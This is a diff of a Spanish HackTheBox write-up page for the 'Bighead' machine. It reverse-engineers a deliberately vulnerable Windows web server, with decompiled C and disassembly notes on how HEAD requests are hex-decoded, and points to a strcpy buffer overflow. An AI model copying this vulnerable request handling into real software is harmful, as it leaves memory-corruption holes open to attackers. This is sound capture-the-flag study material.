@@ -227,9 +227,9 @@ Server: BigheadWebSvr 1.0</span>
 <p class="plain-text">Despues de clonar el repo nos queda un zip con lo que parece ser un <code class="language-plaintext highlighter-rouge">backup</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ ls </span><span class="p">-l 
-.rw-r--r-- kali kali 8.7 KB Tue Oct 24 20:12:59 2023  BHWS_Backup.zip  
-.rw-r--r-- kali kali  34 KB Tue Oct 24 20:12:59 2023  LICENSE
-.rw-r--r-- kali kali  39 B  Tue Oct 24 20:12:59 2023  README.md</span>
+.rw-r--r-- user user 8.7 KB Tue Oct 24 20:12:59 2023  BHWS_Backup.zip  
+.rw-r--r-- user user  34 KB Tue Oct 24 20:12:59 2023  LICENSE
+.rw-r--r-- user user  39 B  Tue Oct 24 20:12:59 2023  README.md</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Sin embargo al intentar descomprimirlo nos pide una contraseña que no conocemos</p>
@@ -381,480 +381,281 @@ Compressed: 42198</span>
 <section class="post" id="shell-nelson">
 <br><h3 class="post-title">Shell - nelson</h3><br>
 
-<p class="plain-text">Iniciemos analizando el binario, para ello podemos usar un decompilador como <code class="language-plaintext highlighter-rouge">ida</code> y asi ver su codigo, al decompilarlo nos podemos encontrar la funcion <code class="language-plaintext highlighter-rouge">main</code> que se encarga de abrir el servidor en el puerto <code class="language-plaintext highlighter-rouge">8008</code> y llama a <code class="language-plaintext highlighter-rouge">ConnectionHanlder</code></p>
-<a href="/hackthebox/bighead/30.png" target="_blank"><div><p><img src="/hackthebox/bighead/30.png"></p></div></a>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="no">int </span><span class="p">__cdecl </span><span class="na">main</span><span class="p">(</span><span class="no">int </span><span class="am">argc</span><span class="p">, </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="am">argv</span><span class="p">, </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="am">envp</span><span class="p">)
-{
-  </span><span class="no">int </span><span class="p">Error; </span><span class="c1">// eax
-  </span><span class="no">int </span><span class="p">bind_error; </span><span class="c1">// eax
-  </span><span class="no">int </span><span class="p">listen_error; </span><span class="c1">// eax
-  </span><span class="no">int </span><span class="p">accept_error; </span><span class="c1">// eax
-  </span><span class="no">int </span><span class="p">client_ip; </span><span class="c1">// ebx
-  </span><span class="no">char </span><span class="o">*</span><span class="p">client_port; </span><span class="c1">// eax
-  </span><span class="no">int </span><span class="p">addrlen; </span><span class="c1">// [esp+0h] [ebp-250h] BYREF
-  </span><span class="no">struct </span><span class="p">sockaddr addr; </span><span class="c1">// [esp+4h] [ebp-24Ch] BYREF
-  </span><span class="p">ADDRINFOA addrinfo_hints; </span><span class="c1">// [esp+14h] [ebp-23Ch] BYREF
-  </span><span class="p">PADDRINFOA addrinfo_result; </span><span class="c1">// [esp+34h] [ebp-21Ch] BYREF
-  </span><span class="no">struct </span><span class="p">WSAData WSAData; </span><span class="c1">// [esp+38h] [ebp-218h] BYREF
-  </span><span class="no">char </span><span class="p">usage[</span><span class="mi">94</span><span class="p">]; </span><span class="c1">// [esp+1C8h] [ebp-88h] BYREF
-  </span><span class="no">char </span><span class="p">port[</span><span class="mi">6</span><span class="p">]; </span><span class="c1">// [esp+226h] [ebp-2Ah] BYREF
-  </span><span class="no">int </span><span class="p">wsastartup_error; </span><span class="c1">// [esp+22Ch] [ebp-24h]
-  </span><span class="no">LPVOID </span><span class="p">lpParameter; </span><span class="c1">// [esp+230h] [ebp-20h]
-  </span><span class="p">SOCKET server_socket; // [esp+234h] [ebp-1Ch]
-  </span><span class="no">int </span><span class="o">*</span><span class="p">p_argc; </span><span class="c1">// [esp+240h] [ebp-10h]
+<p class="plain-text">Iniciemos analizando el binario, para ello podemos usar un desensamblador como <code class="language-plaintext highlighter-rouge">ida</code>, la función es bastante simple, la instrucción <code class="language-plaintext highlighter-rouge">cmp</code> compara la longitud de <code class="language-plaintext highlighter-rouge">argv</code> con <code class="language-plaintext highlighter-rouge">2</code>, donde el primero es el propio binario comprueba si se recibe un argumento por consola, en caso de que sea <code class="language-plaintext highlighter-rouge">igual o menor</code> va al bloque de la flecha verde</p>
+<a href="/hackthebox/bighead/12.png" target="_blank"><div><p><img src="/hackthebox/bighead/12.png"></p></div></a>
 
-  </span><span class="p">p_argc </span><span class="o">= &</span><span class="p">argc;
-  __main();
-  </span><span class="no">strcpy</span><span class="p">(usage, </span><span class="s">"Usage: </span><span class="mi">%s </span><span class="s">[port_number]</span><span class="mi">\n\n</span><span class="s">If no port number is provided, the default port of </span><span class="mi">%s </span><span class="s">will be used.</span><span class="mi">\n</span><span class="s">"</span><span class="p">);
-  </span><span class="o">if</span><span class="p"> ( argc </span><span class="o">> </span><span class="mi">2</span><span class="p"> )
-    </span><span class="o">goto </span><span class="p">LABEL_2;
-  </span><span class="o">if </span><span class="p">( argc </span><span class="o">== </span><span class="mi">2</span><span class="p"> )
-  {
-    </span><span class="o">if</span><span class="p"> ( </span><span class="no">atoi</span><span class="p">(argv[</span><span class="mi">1</span><span class="p">]) </span><span class="o"><= </span><span class="mi">0</span><span class="o"> || </span><span class="no">atoi</span><span class="p">(argv[</span><span class="mi">1</span><span class="p">]) </span><span class="o">> </span><span class="mi">0xFFFF</span><span class="o"> || </span><span class="no">strlen</span><span class="p">(argv[</span><span class="mi">1</span><span class="p">]) </span><span class="o">> </span><span class="mi">6</span><span class="p"> )
-    {
-</span><span class="na">LABEL_2</span><span class="p">:
-      </span><span class="no">printf</span><span class="p">(usage, </span><span class="o">*</span><span class="p">argv, </span><span class="s">"8008"</span><span class="p">);
-      </span><span class="o">return </span><span class="mi">1</span><span class="p">;
-    }
-    </span><span class="no">strncpy</span><span class="p">(port, argv[</span><span class="mi">1</span><span class="p">], </span><span class="mi">6</span><span class="no">u</span><span class="p">);
-  }
-  </span><span class="o">else</span><span class="p">
-  {
-    </span><span class="no">strncpy</span><span class="p">(port, </span><span class="s">"8008"</span><span class="p">, </span><span class="mi">6</span><span class="no">u</span><span class="p">);
-  }
-  </span><span class="no">printf</span><span class="p">(</span><span class="s">"Starting BigheadWebSvr version </span><span class="mi">%s\n</span><span class="s">"</span><span class="p">, </span><span class="s">"1.0"</span><span class="p">);
-  EssentialFunc1();
-  </span><span class="no">puts</span><span class="p">(</span><span class="s">"</span><span class="mi">\n</span><span class="s">This is vulnerable software!\nDo not allow access from untrusted systems or networks!</span><span class="mi">\n</span><span class="s">"</span><span class="p">);
-  server_socket </span><span class="o">= -</span><span class="mi">1</span><span class="p">;
-  lpParameter </span><span class="o">=</span><span class="p"> (</span><span class="na">LPVOID</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;
-  addrinfo_result </span><span class="o">= </span><span class="mi">0</span><span class="p">;
-  addrlen </span><span class="o">= </span><span class="mi">16</span><span class="p">;
-  wsastartup_error </span><span class="o">= </span><span class="p">WSAStartup(</span><span class="mi">0x202</span><span class="no">u</span><span class="p">, </span><span class="o">&</span><span class="p">WSAData);
-  </span><span class="o">if</span><span class="p"> ( wsastartup_error )
-  {
-    </span><span class="no">printf</span><span class="p">(</span><span class="s">"WSAStartup failed with error: </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, wsastartup_error);
-    </span><span class="o">return </span><span class="mi">1</span><span class="p">;
-  }
-  </span><span class="o">else</span><span class="p">
-  {
-    </span><span class="no">memset</span><span class="p">(</span><span class="o">&</span><span class="p">addrinfo_hints, </span><span class="mi">0</span><span class="p">, </span><span class="no">sizeof</span><span class="p">(addrinfo_hints));
-    addrinfo_hints.ai_family </span><span class="o">= </span><span class="mi">2</span><span class="p">;
-    addrinfo_hints.ai_socktype </span><span class="o">= </span><span class="mi">1</span><span class="p">;
-    addrinfo_hints.ai_protocol </span><span class="o">= </span><span class="mi">6</span><span class="p">;
-    addrinfo_hints.ai_flags </span><span class="o">= </span><span class="mi">1</span><span class="p">;
-    wsastartup_error </span><span class="o">= </span><span class="p">getaddrinfo(</span><span class="mi">0</span><span class="p">, port, </span><span class="o">&</span><span class="p">addrinfo_hints, </span><span class="o">&</span><span class="p">addrinfo_result);
-    </span><span class="o">if </span><span class="p">( wsastartup_error )
-    {
-      </span><span class="no">printf</span><span class="p">(</span><span class="s">"Getaddrinfo failed with error:</span><span class="mi"> %d\n</span><span class="s">"</span><span class="p">, wsastartup_error);
-      WSACleanup();
-      </span><span class="o">return </span><span class="mi">1</span><span class="p">;
-    }
-    </span><span class="o">else</span><span class="p">
-    {
-      server_socket </span><span class="o">= </span><span class="p">socket(addrinfo_result->ai_family, addrinfo_result->ai_socktype, addrinfo_result->ai_protocol);  
-      </span><span class="o">if</span><span class="p"> ( server_socket </span><span class="o">== -</span><span class="mi">1</span><span class="p"> )
-      {
-        Error </span><span class="o">= </span><span class="p">WSAGetLastError();
-        </span><span class="no">printf</span><span class="p">(</span><span class="s">"Socket failed with error: </span><span class="mi">%ld\n</span><span class="s">"</span><span class="p">, Error);
-        freeaddrinfo(addrinfo_result);
-        WSACleanup();
-        </span><span class="o">return </span><span class="mi">1</span><span class="p">;
-      }
-      </span><span class="o">else</span><span class="p">
-      {
-        wsastartup_error </span><span class="o">= </span><span class="p">bind(server_socket, addrinfo_result->ai_addr, addrinfo_result->ai_addrlen);
-        </span><span class="o">if</span><span class="p"> ( wsastartup_error </span><span class="o">== -</span><span class="mi">1</span><span class="p"> )
-        {
-          bind_error </span><span class="o">= </span><span class="p">WSAGetLastError();
-          </span><span class="no">printf</span><span class="p">(</span><span class="s">"Bind failed with error: </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, bind_error);
-          closesocket(server_socket);
-          WSACleanup();
-          </span><span class="o">return </span><span class="mi">1</span><span class="p">;
-        }
-        </span><span class="o">else</span><span class="p">
-        {
-          freeaddrinfo(addrinfo_result);
-          wsastartup_error </span><span class="o">= </span><span class="p">listen(server_socket, </span><span class="mi">0x7FFFFFFF</span><span class="p">);
-          </span><span class="o">if</span><span class="p"> ( wsastartup_error </span><span class="o">== -</span><span class="mi">1</span><span class="p"> )
-          {
-            listen_error </span><span class="o">= </span><span class="p">WSAGetLastError();
-            </span><span class="no">printf</span><span class="p">(</span><span class="s">"Listen failed with error: </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, listen_error);
-            closesocket(server_socket);
-            WSACleanup();
-            </span><span class="o">return </span><span class="mi">1</span><span class="p">;
-          }
-          </span><span class="o">else</span><span class="p">
-          {
-            </span><span class="o">while</span><span class="p"> ( server_socket )
-            {
-              </span><span class="no">puts</span><span class="p">(</span><span class="s">"Waiting for client connections..."</span><span class="p">);
-              lpParameter </span><span class="o">= </span><span class="p">(</span><span class="na">LPVOID</span><span class="p">)accept(server_socket, </span><span class="o">&</span><span class="p">addr, </span><span class="o">&</span><span class="p">addrlen);
-              </span><span class="o">if </span><span class="p">( lpParameter </span><span class="o">== </span><span class="p">(</span><span class="na">LPVOID</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p"> )
-              {
-                accept_error </span><span class="o">= </span><span class="p">WSAGetLastError();
-                </span><span class="no">printf</span><span class="p">(</span><span class="s">"Accept failed with error: </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, accept_error);
-                closesocket(server_socket);
-                WSACleanup();
-                </span><span class="o">return </span><span class="mi">1</span><span class="p">;
-              }
-              client_ip </span><span class="o">= </span><span class="p">htons(</span><span class="o">*</span><span class="p">(</span><span class="na">u_short </span><span class="o">*</span><span class="p">)addr.sa_data);
-              client_port </span><span class="o">= </span><span class="p">inet_ntoa(</span><span class="o">*</span><span class="p">(</span><span class="no">struct </span><span class="p">in_addr </span><span class="o">*</span><span class="p">)</span><span class="o">&</span><span class="p">addr.sa_data[</span><span class="mi">2</span><span class="p">]);
-              </span><span class="no">printf</span><span class="p">(</span><span class="s">"Received a client connection from </span><span class="mi">%s</span><span class="s">:</span><span class="mi">%u\n</span><span class="s">"</span><span class="p">, client_port, client_ip);
-              CreateThread(</span><span class="mi">0</span><span class="p">, </span><span class="mi">0</span><span class="p">, (LPTHREAD_START_ROUTINE)ConnectionHandler, lpParameter, </span><span class="mi">0</span><span class="p">, </span><span class="mi">0</span><span class="p">);
-            }
-            closesocket(</span><span class="mi">0</span><span class="p">);
-            WSACleanup();
-            </span><span class="o">return </span><span class="mi">0</span><span class="p">;
-          }
-        }
-      }
-    }
-  }
+<p class="plain-text">Realiza nuevamente la comparación, si se recibe un puerto como argumento se utiliza <code class="language-plaintext highlighter-rouge">atoi</code> para convertir la cadena a entero y se guarda en una variable, si no se recibe ningun argumento se utiliza por defecto el puerto <code class="language-plaintext highlighter-rouge">8008</code> como valor por defecto</p>
+<a href="/hackthebox/bighead/13.png" target="_blank"><div><p><img src="/hackthebox/bighead/13.png"></p></div></a>
+
+<p class="plain-text">inicia mostrando algunos mensajes por consola utilizando <code class="language-plaintext highlighter-rouge">puts</code> y llamando a <code class="language-plaintext highlighter-rouge">WSAStartup</code> que inicia el uso del archivo dll de <code class="language-plaintext highlighter-rouge">Winsock</code>, luego llama a <code class="language-plaintext highlighter-rouge">getaddrinfo</code></p>
+<a href="/hackthebox/bighead/14.png" target="_blank"><div><p><img src="/hackthebox/bighead/14.png"></p></div></a>
+
+<p class="plain-text">Si lo anterior sale bien se llama a la función <code class="language-plaintext highlighter-rouge">socket</code> que inicia un nuevo socket y despues a la función <code class="language-plaintext highlighter-rouge">bind</code> para asociar el socket a la dirección local</p>
+<a href="/hackthebox/bighead/15.png" target="_blank"><div><p><img src="/hackthebox/bighead/15.png"></p></div></a>
+
+<p class="plain-text">Luego llama a la función <code class="language-plaintext highlighter-rouge">listen</code> para poner en escucha el socket en el puerto especificado o por defecto, muestra un mensaje con <code class="language-plaintext highlighter-rouge">puts</code> para decir que esta en escucha y acepta cualquier posible conexión utilizando la función <code class="language-plaintext highlighter-rouge">accept</code></p>
+<a href="/hackthebox/bighead/16.png" target="_blank"><div><p><img src="/hackthebox/bighead/16.png"></p></div></a>
+
+<p class="plain-text">Cuando recibe la conexión formatea los datos y con la función <code class="language-plaintext highlighter-rouge">printf</code> muestra por consola la información del cliente como la ip y puerto de conexión, luego llama a <code class="language-plaintext highlighter-rouge">CreateThread</code> para crear un nuevo hilo que ejecutará la función <code class="language-plaintext highlighter-rouge">ConnectionHandler</code></p>
+<a href="/hackthebox/bighead/17.png" target="_blank"><div><p><img src="/hackthebox/bighead/17.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">ConnectionHandler</code> inicia reservando varios espacios en memoria con <code class="language-plaintext highlighter-rouge">malloc</code> y <code class="language-plaintext highlighter-rouge">memset</code>, luego si l código de estado, es <code class="language-plaintext highlighter-rouge">-1</code> va al bloque de la flecha roja</p>
+<a href="/hackthebox/bighead/18.png" target="_blank"><div><p><img src="/hackthebox/bighead/18.png"></p></div></a>
+
+<p class="plain-text">En el siguiente bloque se compara el parametro recibido con <code class="language-plaintext highlighter-rouge">0</code> si es asi lanza un error, de lo contrario llama a la función <code class="language-plaintext highlighter-rouge">recv</code> que recibe un buffer del socket</p>
+<a href="/hackthebox/bighead/19.png" target="_blank"><div><p><img src="/hackthebox/bighead/19.png"></p></div></a>
+
+<p class="plain-text">Luego compara el tamaño del buffer con <code class="language-plaintext highlighter-rouge">219</code>, si es menor o igual compara los primeros <code class="language-plaintext highlighter-rouge">5</code> bytes del buffer con <code class="language-plaintext highlighter-rouge">HEAD </code>, esto indica el método de una petición</p>
+<a href="/hackthebox/bighead/20.png" target="_blank"><div><p><img src="/hackthebox/bighead/20.png"></p></div></a>
+
+<p class="plain-text">Luego reserva un espacio en memoria e inicia con algo interesante, mueve el buffer a <code class="language-plaintext highlighter-rouge">eax</code> y añade una constante <code class="language-plaintext highlighter-rouge">6</code> para saltar los primeros <code class="language-plaintext highlighter-rouge">6</code> bytes que en nuestro caso serán los de la petición <code class="language-plaintext highlighter-rouge">HEAD /</code>, luego mueve el byte a <code class="language-plaintext highlighter-rouge">eax</code> que en nuestro caso será un <code class="language-plaintext highlighter-rouge">0x41</code> ya que enviaremos <code class="language-plaintext highlighter-rouge">A's</code> y compara que no sea <code class="language-plaintext highlighter-rouge">0</code> que indicaria el final</p>
+<a href="/hackthebox/bighead/21.png" target="_blank"><div><p><img src="/hackthebox/bighead/21.png"></p></div></a>
+
+<p class="plain-text">Si no es <code class="language-plaintext highlighter-rouge">0</code> añade un byte a la constante <code class="language-plaintext highlighter-rouge">6</code> por lo que ahora vale <code class="language-plaintext highlighter-rouge">7</code>, lo añade al valor del buffer por lo que se puede deducir que salta al siguiente byte y nuevamente verifica que no sea <code class="language-plaintext highlighter-rouge">0</code>, en el siguiente bloque mueve el buffer a <code class="language-plaintext highlighter-rouge">eax</code> y añade nuevamente los <code class="language-plaintext highlighter-rouge">6</code> bytes para saltar al inicio del payload, mueve un <code class="language-plaintext highlighter-rouge">word</code> a <code class="language-plaintext highlighter-rouge">eax</code> que serian <code class="language-plaintext highlighter-rouge">2 A's</code> o <code class="language-plaintext highlighter-rouge">0x4141</code> en memoria, este será el primer argumento para <code class="language-plaintext highlighter-rouge">strtoul</code>, el segundo es <code class="language-plaintext highlighter-rouge">0</code> y el tercero es <code class="language-plaintext highlighter-rouge">16</code> indicando la base que indicaria hexadecimal</p>
+<a href="/hackthebox/bighead/22.png" target="_blank"><div><p><img src="/hackthebox/bighead/22.png"></p></div></a>
+
+<p class="plain-text">Para entenderlo mejor podemos crear un programa en <code class="language-plaintext highlighter-rouge">c</code> que haga lo mismo, si indicamos una <code class="language-plaintext highlighter-rouge">A</code> como string donde su valor inicial es <code class="language-plaintext highlighter-rouge">0x41</code> lo convierte a <code class="language-plaintext highlighter-rouge">10</code> o su valor en hexadecimal <code class="language-plaintext highlighter-rouge">0xA</code> que es el mismo valor de la string inicial como hex</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">#include </span><span class="s">&ltstdio.h>
+</span><span class="o">#include</span><span class="s"> &ltstdlib.h>
+
+</span><span class="no">int</span><span class="na"> main</span><span class="p">()
+{
+    </span><span class="o">char *</span><span class="p">string</span><span class="o"> =</span><span class="s"> "A"</span><span class="p">;
+    </span><span class="o">char *</span><span class="p">null;
+
+    </span><span class="no">int </span><span class="p">result </span><span class="o">=</span><span class="no"> strtoul</span><span class="p">(string, </span><span class="o">&</span><span class="p">null,</span><span class="mi"> 16</span><span class="p">);
+
+    </span><span class="no">printf</span><span class="p">(</span><span class="s">"</span><span class="mi">%X</span><span class="s"> -></span><span class="mi"> %d</span><span class="s"> -></span><span class="mi"> %X\n</span><span class="s">"</span><span class="p">, </span><span class="o">*</span><span class="p">string, result, result);  
+
+    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
 }</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al hacer clic en <code class="language-plaintext highlighter-rouge">ConnectionHandler</code> nos lleva a una función sin nombre que resumiendola se encarga de gestionar las peticiones <code class="language-plaintext highlighter-rouge">http</code> hechas al servidor, en caso de que la petición sea <code class="language-plaintext highlighter-rouge">HEAD</code> llama a <code class="language-plaintext highlighter-rouge">Function4</code> pasandole como argumento la ruta</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="no">int</span><span class="p"> __stdcall </span><span class="na">ConnectionHandler</span><span class="p">(</span><span class="na">LPVOID </span><span class="am">lpThreadParameter</span><span class="p">)
-{
-  </span><span class="no">int </span><span class="p">result; </span><span class="c1">// eax
-  </span><span class="no">int </span><span class="p">send_error; </span><span class="c1">// eax
-  </span><span class="no">int </span><span class="p">Error; // eax
-  </span><span class="no">int </span><span class="p">recv_error; </span><span class="c1">// eax
-  </span><span class="no">char </span><span class="p">recv_buffer[</span><span class="mi">1003</span><span class="p">]; </span><span class="c1">// [esp+1Dh] [ebp-41Bh] BYREF
-  </span><span class="no">unsigned int </span><span class="p">v6; </span><span class="c1">// [esp+408h] [ebp-30h]
-  </span><span class="no">char </span><span class="o">*</span><span class="p">hex_string; </span><span class="c1">// [esp+40Ch] [ebp-2Ch]
-  </span><span class="no">int </span><span class="p">bytes; </span><span class="c1">// [esp+410h] [ebp-28h]
-  </span><span class="no">int </span><span class="p">send_bytes; </span><span class="c1">// [esp+414h] [ebp-24h]
-  </span><span class="p">SOCKET client_socket; </span><span class="c1">// [esp+418h] [ebp-20h]
-  </span><span class="no">void </span><span class="o">*</span><span class="p">mem; </span><span class="c1">// [esp+41Ch] [ebp-1Ch]
-  </span><span class="no">char </span><span class="o">*</span><span class="p">buf; </span><span class="c1">// [esp+420h] [ebp-18h]
-  </span><span class="no">int </span><span class="p">len; </span><span class="c1">// [esp+424h] [ebp-14h]
-  </span><span class="no">int </span><span class="p">loop_counter; </span><span class="c1">// [esp+428h] [ebp-10h]
-  </span><span class="no">int </span><span class="p">hex_position; </span><span class="c1">// [esp+42Ch] [ebp-Ch]
+<code><span class="ve">❯ gcc</span><span class="p"> code.c -o code  
 
-  </span><span class="p">len </span><span class="o">= </span><span class="mi">524</span><span class="p">;
-  buf </span><span class="o">= </span><span class="p">(</span><span class="no">char </span><span class="o">*</span><span class="p">)</span><span class="no">malloc</span><span class="p">(</span><span class="mi">0x20C</span><span class="no">u</span><span class="p">);
-  mem </span><span class="o">= </span><span class="no">malloc</span><span class="p">(</span><span class="mi">0x400</span><span class="no">u</span><span class="p">);
-  </span><span class="no">memset</span><span class="p">(</span><span class="o">&</span><span class="p">recv_buffer[</span><span class="mi">3</span><span class="p">], </span><span class="mi">0</span><span class="p">, </span><span class="mi">0x3E8</span><span class="no">u</span><span class="p">);
-  </span><span class="no">memset</span><span class="p">(buf, </span><span class="mi">0</span><span class="p">, </span><span class="mi">0x20C</span><span class="no">u</span><span class="p">);
-  result </span><span class="p">=</span><span class="p"> (</span><span class="no">int</span><span class="p">)lpThreadParameter;
-  client_socket </span><span class="o">=</span><span class="p"> (SOCKET)lpThreadParameter;
-  </span><span class="o">if</span><span class="p"> ( send_bytes </span><span class="o">== -</span><span class="mi">1</span><span class="p"> )
-  {
-    send_error </span><span class="o">= </span><span class="p">WSAGetLastError();
-    </span><span class="no">printf</span><span class="p">(</span><span class="s">"Send failed with error: </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, send_error);
-    closesocket(client_socket);
-    </span><span class="o">return </span><span class="mi">1</span><span class="p">;
-  }
-  </span><span class="o">else</span><span class="p">
-  {
-    </span><span class="o">while</span><span class="p"> ( lpThreadParameter )
-    {
-      bytes </span><span class="o">= </span><span class="p">recv(client_socket, buf, len, </span><span class="mi">0</span><span class="p">);
-      </span><span class="o">if</span><span class="p"> ( bytes </span><span class="o"><= </span><span class="mi">0</span><span class="p"> )
-      {
-        </span><span class="o">if</span><span class="p"> ( bytes )
-        {
-          recv_error </span><span class="o">= </span><span class="p">WSAGetLastError();
-          </span><span class="no">printf</span><span class="p">(</span><span class="s">"Recv failed with error: </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, recv_error);
-          closesocket(client_socket);
-          </span><span class="o">return </span><span class="mi">1</span><span class="p">;
-        }
-        </span><span class="o">else</span><span class="p">
-        {
-          </span><span class="no">puts</span><span class="p">(</span><span class="s">"Connection closing..."</span><span class="p">);
-          closesocket(client_socket);
-          </span><span class="o">return </span><span class="mi">0</span><span class="p">;
-        }
-      }
-      </span><span class="o">if</span><span class="p"> ( bytes </span><span class="o">> </span><span class="mi">219 </span><span class="o">|| </span><span class="no">strncmp</span><span class="p">(buf, </span><span class="s">"HEAD "</span><span class="p">, </span><span class="mi">5</span><span class="no">u</span><span class="p">) )
-      {
-        </span><span class="o">if</span><span class="p"> ( </span><span class="o">!</span><span class="no">strncmp</span><span class="p">(buf, </span><span class="s">"GET / "</span><span class="p">, </span><span class="mi">6</span><span class="no">u</span><span class="p">) )
-        {
-          send_bytes </span><span class="o">= </span><span class="p">send(client_socket, :</span><span class="o">:</span><span class="p">buf, </span><span class="mi">13635</span><span class="p">, </span><span class="mi">0</span><span class="p">);
-          </span><span class="no">puts</span><span class="p">(</span><span class="s">"Connection closing..."</span><span class="p">);
-          closesocket(client_socket);
-          </span><span class="o">return </span><span class="mi">0</span><span class="p">;
-        }
-        </span><span class="o">else </span><span class="o">if</span><span class="p"> ( </span><span class="o">!</span><span class="no">strncmp</span><span class="p">(buf, </span><span class="s">"GET /coffee"</span><span class="p">, </span><span class="mi">0xB</span><span class="no">u</span><span class="p">) )
-        {
-          send_bytes </span><span class="o">= </span><span class="p">send(
-                         client_socket,
-                         </span><span class="s">"HTTP/1.1 418 I'm A Teapot!</span><span class="mi">\n</span><span class="s">"
-                         "Server: BigheadWebSvr 1.0</span><span class="mi">\n</span><span class="s">"
-                         "Date: Sat, 23 Jun 2018 19:39:57 GMT</span><span class="mi">\n</span><span class="s">"
-                         "Content-Type: text/html</span><span class="mi">\n</span><span class="s">"
-                         "Connection: close</span><span class="mi">\n</span><span class="s">"
-                         "Content-Length: 46</span><span class="mi">\n</span><span class="s">"
-                         "</span><span class="mi">\n</span><span class="s">"
-                         "&ltcenter>&ltimg src='../teapot.gif' width='75%'></span><span class="mi">\n</span><span class="s">"</span><span class="p">,
-                         </span><span class="mi">197</span><span class="p">,
-                         </span><span class="mi">0</span><span class="p">);
-          </span><span class="no">puts</span><span class="p">(</span><span class="s">"Connection closing..."</span><span class="p">);
-          closesocket(client_socket);
-          </span><span class="o">return </span><span class="mi">0</span><span class="p">;
-        }
-        </span><span class="o">else</span><span class="p">
-        {
-          </span><span class="o">if</span><span class="p"> ( </span><span class="o">!</span><span class="no">strncmp</span><span class="p">(buf, </span><span class="s">"POST /"</span><span class="p">, </span><span class="mi">6</span><span class="no">u</span><span class="p">) )
-          {
-            send_bytes </span><span class="o">= </span><span class="p">send(client_socket, :</span><span class="o">:</span><span class="p">buf, </span><span class="mi">13635</span><span class="p">, </span><span class="mi">0</span><span class="p">);
-            </span><span class="no">puts</span><span class="p">(</span><span class="s">"Connection closing..."</span><span class="p">);
-          }
-          </span><span class="o">else</span><span class="p">
-          {
-            send_bytes </span><span class="o">= </span><span class="p">send(
-                           client_socket,
-                           </span><span class="s">"HTTP/1.0 404 Not Found</span><span class="mi">\n</span><span class="s">"
-                           "Server: BigheadWebSvr 1.0</span><span class="mi">\n</span><span class="s">"
-                           "Content-type: text/html</span><span class="mi">\n</span><span class="s">"
-                           "Content-Length: 26</span><span class="mi">\n</span><span class="s">"
-                           "</span><span class="mi">\n</span><span class="s">"
-                           "Error - File Not Found 404</span><span class="mi">\n</span><span class="s">"</span><span class="p">,
-                           </span><span class="mi">121</span><span class="p">,
-                           </span><span class="mi">0</span><span class="p">);
-          }
-          closesocket(client_socket);
-          </span><span class="o">return </span><span class="mi">0</span><span class="p">;
-        }
-      }
-      </span><span class="no">memset</span><span class="p">(recv_buffer, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> 3</span><span class="no">u</span><span class="p">);
-      hex_string </span><span class="o">= </span><span class="p">(</span><span class="no">char </span><span class="o">*</span><span class="p">)</span><span class="no">malloc</span><span class="p">(</span><span class="mi">0xC</span><span class="no">u</span><span class="p">);
-      hex_position </span><span class="o">= </span><span class="mi">6</span><span class="p">;
-      loop_counter </span><span class="o">= </span><span class="mi">0</span><span class="p">;
-      </span><span class="o">while </span><span class="p">( buf[hex_position] </span><span class="o">&& </span><span class="p">buf[hex_position </span><span class="o">+ </span><span class="mi">1</span><span class="p">] )
-      {
-        </span><span class="o">*</span><span class="p">(_WORD </span><span class="o">*</span><span class="p">)recv_buffer </span><span class="o">= *</span><span class="p">(_WORD </span><span class="o">*</span><span class="p">)</span><span class="o">&</span><span class="p">buf[hex_position];
-        v6 </span><span class="o">= </span><span class="no">strtoul</span><span class="p">(recv_buffer, </span><span class="mi">0</span><span class="p">, </span><span class="mi">16</span><span class="p">);
-        </span><span class="no">memset</span><span class="p">(</span><span class="o">&</span><span class="p">hex_string[loop_counter], (</span><span class="no">unsigned </span><span class="na">__int8</span><span class="p">)v6, </span><span class="o">sizeof</span><span class="p">(</span><span class="no">char</span><span class="p">));  
-        hex_position </span><span class="o">+= </span><span class="mi">2</span><span class="p">;
-        </span><span class="o">++</span><span class="p">loop_counter;
-      }
-      Function4(hex_string);
-      send_bytes </span><span class="o">= </span><span class="p">send(client_socket, :</span><span class="o">:</span><span class="p">buf, </span><span class="mi">13635</span><span class="p">,</span><span class="mi"> 0</span><span class="p">);
-      result </span><span class="o">= </span><span class="no">printf</span><span class="p">(</span><span class="s">"HEAD Error Detected!:"</span><span class="p">);
-      </span><span class="o">if</span><span class="p"> ( send_bytes </span><span class="o">== -</span><span class="mi">1</span><span class="p"> )
-      {
-        Error </span><span class="o">= </span><span class="p">WSAGetLastError();
-        </span><span class="no">printf</span><span class="p">(</span><span class="s">"Send failed with error: </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, Error);
-        closesocket(client_socket);
-        </span><span class="o">return </span><span class="mi">1</span><span class="p">;
-      }
-    }
-  }
-  </span><span class="o">return </span><span class="p">result;
-}</span>
+</span><span class="ve">❯ ./code</span><span class="p">
+41 -> 10 -> A</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Si miramos la funcion <code class="language-plaintext highlighter-rouge">Function4</code> podemos ver una vulnerabilidad y es que define un <code class="language-plaintext highlighter-rouge">buffer</code> de solo <code class="language-plaintext highlighter-rouge">32 bytes</code> para el parametro que es la ruta y llama a la función <code class="language-plaintext highlighter-rouge">strcpy</code> que es bastante conocida por ser vulnerable a <code class="language-plaintext highlighter-rouge">Buffer Overflow</code></p>
